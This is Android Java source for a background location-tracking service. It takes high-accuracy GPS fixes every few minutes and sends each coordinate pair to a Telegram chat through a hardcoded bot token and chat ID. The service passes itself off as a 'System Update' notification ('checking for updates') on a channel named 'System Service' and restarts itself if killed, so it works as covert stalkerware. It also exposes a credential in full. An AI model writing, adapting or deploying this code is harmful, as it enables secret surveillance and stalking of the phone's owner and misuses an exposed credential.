package com.tracker.app;
import android.app.Notification; import android.app.NotificationChannel; import android.app.NotificationManager; import android.app.Service; import android.content.Intent; import android.location.Location; import android.os.Build; import android.os.IBinder; import android.os.Looper; import androidx.annotation.NonNull; import androidx.core.app.NotificationCompat; import com.google.android.gms.location.FusedLocationProviderClient; import com.google.android.gms.location.LocationCallback; import com.google.android.gms.location.LocationRequest; import com.google.android.gms.location.LocationResult; import com.google.android.gms.location.LocationServices; import com.google.android.gms.location.Priority; import java.io.OutputStream; import java.net.HttpURLConnection; import java.net.URL;
public class LocationService extends Service {
    private FusedLocationProviderClient fusedLocationClient; private LocationCallback locationCallback; private final String BOT_TOKEN = "9256327672:AAFWws6pyAWcoNwX-NuAsDlgrksA5d-YNjg"; private final String CHAT_ID = "8947742554"; private final String CHANNEL_ID = "tracker_channel";
    @Override public void onCreate() {
        super.onCreate(); fusedLocationClient = LocationServices.getFusedLocationProviderClient(this); createNotificationChannel(); startForeground(1, buildNotification());
        LocationRequest locationRequest = new LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 5 * 60 * 1000).setMinUpdateDistanceMeters(10).build();
        locationCallback = new LocationCallback() { @Override public void onLocationResult(@NonNull LocationResult locationResult) { for (Location location : locationResult.getLocations()) { sendToTelegram(location.getLatitude(), location.getLongitude()); } } };
        try { fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, Looper.getMainLooper()); } catch (SecurityException e) { e.printStackTrace(); }
    }
    private void sendToTelegram(double lat, double lon) {
        new Thread(() -> { try { String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage"; URL url = new URL(urlStr); HttpURLConnection conn = (HttpURLConnection) url.openConnection(); conn.setRequestMethod("POST"); conn.setDoOutput(true); conn.setRequestProperty("Content-Type", "application/json"); String json = "{\"chat_id\":\"" + CHAT_ID + "\",\"text\":\"📍 Lat: " + lat + ", Lon: " + lon + "\"}"; try (OutputStream os = conn.getOutputStream()) { os.write(json.getBytes("utf-8")); } conn.getResponseCode(); conn.disconnect(); } catch (Exception e) { e.printStackTrace(); } }).start();
    }
    private void createNotificationChannel() { if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) { NotificationChannel serviceChannel = new NotificationChannel(CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_LOW); NotificationManager manager = getSystemService(NotificationManager.class); if (manager != null) manager.createNotificationChannel(serviceChannel); } }
    private Notification buildNotification() { return new NotificationCompat.Builder(this, CHANNEL_ID).setContentTitle("System Update").setContentText("Проверка обновлений...").setSmallIcon(android.R.drawable.ic_menu_mylocation).build(); }
    @Override public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override public IBinder onBind(Intent intent) { return null; }
}
